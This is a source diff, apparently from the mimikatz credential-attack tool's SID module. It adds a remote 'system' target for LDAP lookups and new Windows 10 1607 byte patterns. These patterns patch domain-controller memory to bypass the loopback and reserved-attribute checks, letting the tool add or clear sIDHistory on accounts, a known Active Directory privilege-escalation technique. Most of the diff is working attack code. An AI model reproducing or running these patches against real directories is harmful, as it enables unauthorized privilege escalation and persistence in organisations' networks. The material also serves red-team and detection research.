@@ -25,7 +25,8 @@ NTSTATUS kuhl_m_sid_lookup(int argc, wchar_t * argv[])
 	PWSTR name, domain;
 	PSID pSid;
 	SID_NAME_USE nameUse;
-	PCWCHAR szName;
+	PCWCHAR szName, szSystem = NULL;
+	kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL);
 
 	if(kull_m_string_args_byName(argc, argv, L"sid", &szName, NULL))
 	{
@@ -34,7 +35,7 @@ NTSTATUS kuhl_m_sid_lookup(int argc, wchar_t * argv[])
 			kprintf(L"SID   : %s\n", szName);
 			if(IsValidSid(pSid))
 			{
-				if(kull_m_token_getNameDomainFromSID(pSid, &name, &domain, &nameUse))
+				if(kull_m_token_getNameDomainFromSID(pSid, &name, &domain, &nameUse, szSystem))
 				{
 					kprintf(L"Type  : %s\n"
 						L"Domain: %s\n"
@@ -52,7 +53,7 @@ NTSTATUS kuhl_m_sid_lookup(int argc, wchar_t * argv[])
 	else if(kull_m_string_args_byName(argc, argv, L"name", &szName, NULL))
 	{
 		kprintf(L"Name  : %s\n", szName);
-		if(kull_m_token_getSidDomainFromName(szName, &pSid, &domain, &nameUse))
+		if(kull_m_token_getSidDomainFromName(szName, &pSid, &domain, &nameUse, szSystem))
 		{
 			kprintf(L"Type  : %s\n"
 				L"Domain: %s\n"
@@ -73,7 +74,10 @@ NTSTATUS kuhl_m_sid_query(int argc, wchar_t * argv[])
 {
 	PLDAP ld;
 	PLDAPMessage pMessage = NULL;
-	if(kuhl_m_sid_quickSearch(argc, argv, FALSE, &ld, &pMessage))
+	PCWCHAR szSystem = NULL;
+	kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL);
+
+	if(kuhl_m_sid_quickSearch(argc, argv, FALSE, szSystem, &ld, &pMessage))
 	{
 		if(pMessage)
 			ldap_msgfree(pMessage);
@@ -101,7 +105,7 @@ NTSTATUS kuhl_m_sid_modify(int argc, wchar_t * argv[])
 			if(IsValidSid((PSID) NewSid.bv_val))
 			{
 				NewSid.bv_len = GetLengthSid((PSID) NewSid.bv_val);
-				if(kuhl_m_sid_quickSearch(argc, argv, TRUE, &ld, &pMessage))
+				if(kuhl_m_sid_quickSearch(argc, argv, TRUE, NULL, &ld, &pMessage))
 				{
 					kprintf(L"\n  * Will try to modify \'%s\' to \'", Modification.mod_type);
 					kull_m_string_displaySID(NewSid.bv_val);
@@ -139,12 +143,12 @@ NTSTATUS kuhl_m_sid_add(int argc, wchar_t * argv[])
 
 	if(kull_m_string_args_byName(argc, argv, L"new", &szName, NULL))
 	{
-		if(ConvertStringSidToSid(szName, (PSID *) &NewSid.bv_val) || kull_m_token_getSidDomainFromName(szName, (PSID *) &NewSid.bv_val, &domain, NULL))
+		if(ConvertStringSidToSid(szName, (PSID *) &NewSid.bv_val) || kull_m_token_getSidDomainFromName(szName, (PSID *) &NewSid.bv_val, &domain, NULL, NULL))
 		{
 			if(IsValidSid((PSID) NewSid.bv_val))
 			{
 				NewSid.bv_len = GetLengthSid((PSID) NewSid.bv_val);
-				if(kuhl_m_sid_quickSearch(argc, argv, TRUE, &ld, &pMessage))
+				if(kuhl_m_sid_quickSearch(argc, argv, TRUE, NULL, &ld, &pMessage))
 				{
 					kprintf(L"\n  * Will try to add \'%s\' this new SID:\'", Modification.mod_type);
 					kull_m_string_displaySID(NewSid.bv_val);
@@ -178,7 +182,7 @@ NTSTATUS kuhl_m_sid_clear(int argc, wchar_t * argv[])
 	LDAPMod Modification = {LDAP_MOD_DELETE, L"sIDHistory", NULL};
 	PLDAPMod pModification[2] = {&Modification, NULL};
 
-	if(kuhl_m_sid_quickSearch(argc, argv, TRUE, &ld, &pMessage))
+	if(kuhl_m_sid_quickSearch(argc, argv, TRUE, NULL, &ld, &pMessage))
 	{
 		kprintf(L"\n  * Will try to clear \'%s\': ", Modification.mod_type);
 		dwErr = ldap_modify_s(ld, ldap_get_dn(ld, pMessage), pModification);
@@ -202,19 +206,23 @@ BYTE PTRN_6NOP[]		= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
 BYTE PTRN_WN52_LoopBackCheck[]	= {0x48, 0x8b, 0xd8, 0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0xc7, 0x07, 0x01, 0x00, 0x00, 0x00, 0x83};
 BYTE PTRN_WN61_LoopBackCheck[]	= {0x48, 0x8b, 0xf8, 0x48, 0x89, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x41, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x44, 0x89, 0x33, 0x33, 0xdb, 0x39};
 BYTE PTRN_WN81_LoopBackCheck[]	= {0x41, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x45, 0x89, 0x34, 0x24, 0x83};
+BYTE PTRN_WN10_1607_LoopBackCheck[]	= {0x44, 0x8d, 0x70, 0x01, 0x45, 0x89, 0x34, 0x24, 0x39, 0x05};
 KULL_M_PATCH_GENERIC LoopBackCheckReferences[] = {
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WN52_LoopBackCheck),	PTRN_WN52_LoopBackCheck},	{sizeof(PTRN_JMP_NEAR), PTRN_JMP_NEAR}, {24}},
 	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LoopBackCheck),	PTRN_WN61_LoopBackCheck},	{sizeof(PTRN_JMP_NEAR), PTRN_JMP_NEAR}, {28}},
 	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_LoopBackCheck),	PTRN_WN81_LoopBackCheck},	{sizeof(PTRN_JMP), PTRN_JMP}, {17}},
+	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_LoopBackCheck),	PTRN_WN10_1607_LoopBackCheck},	{sizeof(PTRN_JMP), PTRN_JMP}, {14}},
 };
 // ModSetAttsHelperPreProcess:SysModReservedAtt
 BYTE PTRN_WN52_SysModReservedAtt[] = {0x0f, 0xb7, 0x8c, 0x24, 0xc8, 0x00, 0x00, 0x00};
 BYTE PTRN_WN61_SysModReservedAtt[] = {0x0f, 0xb7, 0x8c, 0x24, 0x78, 0x01, 0x00, 0x00, 0x4d, 0x8b, 0x6d, 0x00};
 BYTE PTRN_WN81_SysModReservedAtt[] = {0x0f, 0xb7, 0x8c, 0x24, 0xb8, 0x00, 0x00, 0x00};
+BYTE PTRN_WN10_1607_SysModReservedAtt[]	= {0x8b, 0xbc, 0x24, 0xd8, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x0f, 0xb7, 0x8c, 0x24, 0xc8, 0x00, 0x00, 0x00};
 KULL_M_PATCH_GENERIC SysModReservedAttReferences[] = {
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WN52_SysModReservedAtt),	PTRN_WN52_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
 	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_SysModReservedAtt),	PTRN_WN61_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
 	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_SysModReservedAtt),	PTRN_WN81_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
+	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_SysModReservedAtt),	PTRN_WN10_1607_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
 };
 #elif defined _M_IX86
 #endif
@@ -282,7 +290,7 @@ void kuhl_m_sid_displayMessage(PLDAP ld, PLDAPMessage pMessage)
 						if((_wcsicmp(pAttribute, L"sIDHistory") == 0))
 						{
 							kull_m_string_displaySID(pBerVal[i]->bv_val);
-							if(kull_m_token_getNameDomainFromSID(pBerVal[i]->bv_val, &name, &domain, &nameUse))
+							if(kull_m_token_getNameDomainFromSID(pBerVal[i]->bv_val, &name, &domain, &nameUse, NULL))
 							{
 								kprintf(L" ( %s -- %s\\%s )", kull_m_token_getSidNameUse(nameUse), domain, name);
 								LocalFree(name);
@@ -302,14 +310,14 @@ void kuhl_m_sid_displayMessage(PLDAP ld, PLDAPMessage pMessage)
 	}
 }
 
-BOOL kuhl_m_sid_quickSearch(int argc, wchar_t * argv[], BOOL needUnique, PLDAP *ld, PLDAPMessage *pMessage)
+BOOL kuhl_m_sid_quickSearch(int argc, wchar_t * argv[], BOOL needUnique, PCWCHAR system, PLDAP *ld, PLDAPMessage *pMessage)
 {
 	BOOL status = FALSE;
 	DWORD dwErr;
 	PWCHAR myAttrs[] = {L"name", L"sAMAccountName", L"objectSid", L"sIDHistory", L"objectGUID", NULL}, dn, filter;
 	if(filter = kuhl_m_sid_filterFromArgs(argc, argv))
 	{
-		if(kuhl_m_sid_getLdapAndRootDN(ld, &dn))
+		if(kuhl_m_sid_getLdapAndRootDN(system, ld, &dn))
 		{
 			*pMessage = NULL;
 			dwErr = ldap_search_s(*ld, dn, LDAP_SCOPE_SUBTREE, filter, myAttrs, FALSE, pMessage);
@@ -392,12 +400,12 @@ PWCHAR kuhl_m_sid_filterFromArgs(int argc, wchar_t * argv[])
 	return filter;
 }
 
-BOOL kuhl_m_sid_getLdapAndRootDN(PLDAP *ld, PWCHAR *rootDn)
+BOOL kuhl_m_sid_getLdapAndRootDN(PCWCHAR system, PLDAP *ld, PWCHAR *rootDn)
 {
 	BOOL status = FALSE;
 	DWORD dwErr;
 
-	if(*ld = ldap_init(NULL, LDAP_PORT))
+	if(*ld = ldap_init((PWCHAR) system, LDAP_PORT))
 	{
 		if(*rootDn = kuhl_m_sid_getRootDomainNamingContext(*ld))
 		{
